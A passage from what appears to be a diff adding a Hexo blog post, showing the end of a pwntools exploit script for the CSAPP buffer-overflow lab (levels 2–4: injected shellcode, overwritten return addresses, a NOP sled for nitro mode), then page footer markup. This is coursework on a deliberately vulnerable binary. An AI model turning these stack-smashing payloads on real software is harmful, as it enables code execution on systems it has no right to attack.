class="hljs-string">&quot;fizz&quot;</span>]) + cyclic(<span class="hljs-number">4</span>) + p32(self.cookie)<br>        )<br>        self.prog.sendline(payload)<br>        self.prog.interactive()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">level2</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self._init_prog(self.<span class="hljs-built_in">id</span>)<br>        code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        mov eax, &#123;cookie&#125;</span><br><span class="hljs-string">        mov ebx, &#123;global_value&#125;</span><br><span class="hljs-string">        mov [ebx], eax</span><br><span class="hljs-string">        mov ecx, &#123;bang&#125; </span><br><span class="hljs-string">        call ecx</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<br>            cookie=<span class="hljs-built_in">hex</span>(self.cookie),<br>            global_value=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;global_value&quot;</span>]),<br>            bang=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;bang&quot;</span>]),<br>        )<br>        payload = asm(code).ljust(<span class="hljs-number">0x2C</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) + p32(<span class="hljs-number">0x55683618</span>)<br>        self.prog.sendline(payload)<br>        self.prog.interactive()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">level3</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self._init_prog(self.<span class="hljs-built_in">id</span>)<br>        code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        mov eax, &#123;cookie&#125;</span><br><span class="hljs-string">        push &#123;getbuf_ret&#125;</span><br><span class="hljs-string">        ret</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<br>            cookie=<span class="hljs-built_in">hex</span>(self.cookie),<br>            getbuf_ret=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;test&quot;</span>] + <span class="hljs-number">20</span>),<br>        )<br>        payload = asm(code).ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) + p32(<span class="hljs-number">0x55683670</span>) + p32(<span class="hljs-number">0x55683618</span>)<br>        self.prog.sendline(payload)<br>        self.prog.interactive()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">level4</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self._init_prog(self.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;nitro&quot;</span>)<br>        code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        mov eax, &#123;cookie&#125;</span><br><span class="hljs-string">        lea ebp, [esp + 0x28]</span><br><span class="hljs-string">        push &#123;getbuf_ret&#125;</span><br><span class="hljs-string">        ret</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<br>            cookie=<span class="hljs-built_in">hex</span>(self.cookie),<br>            getbuf_ret=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;testn&quot;</span>] + <span class="hljs-number">20</span>),<br>        )<br>        payload = asm(code).rjust(<span class="hljs-number">0x208</span>, <span class="hljs-string">b&quot;\x90&quot;</span>) + p32(<span class="hljs-number">0x55683670</span>) + p32(<span class="hljs-number">0x55683448</span>)<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            self.prog.sendline(payload)<br>            self.prog.recv()<br>        self.prog.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CSAPP/" rel="tag"># CSAPP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/08/summary-before-the-begining/" rel="prev" title="随笔2023-03-08">
+                  <i class="fa fa-angle-left"></i> 随笔2023-03-08
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/03/29/picoctf2023writeup/" rel="next" title="picoCTF2023 Writeup">
+                  picoCTF2023 Writeup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">zeredy879</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
